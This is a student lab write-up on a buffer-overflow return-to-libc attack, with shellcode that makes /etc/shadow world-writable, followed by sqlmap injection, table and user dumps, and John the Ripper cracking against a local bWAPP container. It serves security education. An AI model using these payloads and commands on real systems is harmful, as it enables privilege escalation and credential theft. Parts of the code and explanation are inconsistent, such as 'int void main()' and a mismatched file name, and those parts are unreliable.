# Lab#1, 22110028, Nguyen Mai Huy Hoang, INSE33030E_01FIE

# Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege

```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```

**Question 1:**

- Compile both C programs and shellcode to executable code.
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered.
  You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Answer 1**: 

## 1 Run the docker virtual machine

`docker run -it --privileged -v D:/Year-3-Semester-1/"Information Security"/Midterm:/home/seed/seclabs img4lab`

![image](https://github.com/user-attachments/assets/b8d3f3c4-68a1-4d1b-9465-112a6dcd5df2)

# 2 Compile the c programs

use this command to compile vuln.c

```
gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
```

![image](https://github.com/user-attachments/assets/e826be7b-1755-4c29-a616-9282cff29188)


use this command to comile shellcode.c

```
gcc -g shellcode.c -o shellcode.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
```

![image](https://github.com/user-attachments/assets/f2626b22-f8a3-4106-9227-3016e1233dab)


# 3 Turn off address space layout randomization (ASLR)

`sudo sysctl -w kernel.randomize_va_space=0`

![image](https://github.com/user-attachments/assets/a39e08ff-7977-411f-919a-d9362a9f6a37)

# 4 Analysis stackframe

![image](https://github.com/user-attachments/assets/4b9d03e0-feab-4dcc-9317-0b75c9993fe7)

exploit the stackframe:

- 20 bytes to overflow buf and ebp
- 4 bytes for system address
- 4 byes for exit address
- 4 bytes for the argument of system

# 5 create the environment variable

use `pwd` to find the current path

=> my current path is: /home/seed/seclabs

create new environment:

`export exploitPath="/home/seed/seclabs/shellcode.o"`

![image](https://github.com/user-attachments/assets/39487317-5422-40f5-8b51-41048c6efc8f)

check again with command: `env`

![image](https://github.com/user-attachments/assets/25e1123e-70ea-48df-80b0-3505a6992e1f)





# 6 find addresses

![image](https://github.com/user-attachments/assets/138f0c49-d1b9-4d38-81e3-f87496f4e1af)

system: 0xf7e50db0
exit: 	0xf7e449e0
exploitPath: 0xffffd998

final command:

`r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x98\xd9\xff\xff')")`

result:

![image](https://github.com/user-attachments/assets/fde15867-2484-4f7b-b2af-bac1f75e0097)

**Conclusion**: 

Task 1 involved carrying out a per-processor buffer overflow attack on C programs that could be invoked. This was done by injecting the shellcode that was not protected by appropriate security features that would prevent this level of access to the file permissions of /etc/shadow. This task illustrates well the need for employing such protective features as stack protection or randomized address space.

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

## 1. Install bWaapp

use this command to set up bWapp

`docker pull raesene/bwapp`

`docker run -d -p 80:80 raesene/bwapp`

![image](https://github.com/user-attachments/assets/f5b75076-6243-4bfb-ba7a-a906386c8962)

![image](https://github.com/user-attachments/assets/0fa13582-1dae-45e7-a23f-9271389816b0)


Open `localhost/install.php`

![image](https://github.com/user-attachments/assets/a66abd09-d9d4-4291-8002-4f4854e4dbdf)

login with 
- default username: bee
- default passwod: bug

Homepage after login:

![image](https://github.com/user-attachments/assets/ac23e031-72a6-47ff-926b-a045bc1266b2)


## 2. Install sqlmap

Clone the sql map

`git clone https://github.com/sqlmapproject/sqlmap.git`


## 3. Attack

Get the cookies to attack:

![image](https://github.com/user-attachments/assets/7dde2c3d-4030-4192-ae7f-eed1728b1aba)

cookies value: e0cihvhout750mn5fh0tfoevl4


**Question 1**: Use sqlmap to get information about all available databases

go to HTML Injection - Reflected (GET)

![image](https://github.com/user-attachments/assets/21fdc301-8eba-48e4-b58e-39cabe03f620)

Choose random movie and submit GO

![image](https://github.com/user-attachments/assets/2129087b-e7db-4fba-b71f-544c3e047662)


Get the URL:
`http://localhost/sqli_2.php?movie=3&action=go`

delete `action=go` because it is not injectable

use this command to get the result:

`python sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0" --dbs`

**Answer 1**:

![image](https://github.com/user-attachments/assets/828c7767-4cf4-43db-8dbc-21aec306c03a)

result:

![image](https://github.com/user-attachments/assets/a5a252b3-90f2-4d94-821a-f77dd9596abe)

**Question 2**: Use sqlmap to get tables, users information

use this command:

get tables

`python3 sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0"  --tables`

get user informations

`python3 sqlmap.py -u "http://localhost/sqli_2.php?movie=3" --cookie="PHPSESSID=rai86trmqhl5ee4g2h6halric5;security_level=0"  -D bWAPP - T users --dump`

**Answer 2**:

Tables:

![image](https://github.com/user-attachments/assets/f917c10d-1177-4764-8ffe-43110e191332)

![image](https://github.com/user-attachments/assets/e2a9877f-ed3a-40d5-9801-70da3b3b6647)

![image](https://github.com/user-attachments/assets/e3b0d3ab-66bc-4fe6-b9d7-84135fb788b0)

Users information:

![image](https://github.com/user-attachments/assets/0a6ee294-5f2f-487f-b6fb-4a40ef2853b7)


**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit

hash file:

![image](https://github.com/user-attachments/assets/b55b6bb9-fcf8-40b8-be8e-6c803fc56b7a)

i already install john before:

use this command to hash:

`sudo ./john hashes.txt`

**Answer 3**:

![image](https://github.com/user-attachments/assets/1e19bfb8-baf1-4bf6-a8a7-41a27197012d)

**Conclusion**:

In Task 2 we worked with sqlmap in order to find the weaknesses within the bWapp application, performing reconnaissance for the existing databases, tables, and users. After that, we used John the Ripper to breach the passwords of the database users, illustrating how easily weak credentials can be cracked. This task highlighted the importance of improving security measures to prevent SQL injections into data storing databases.
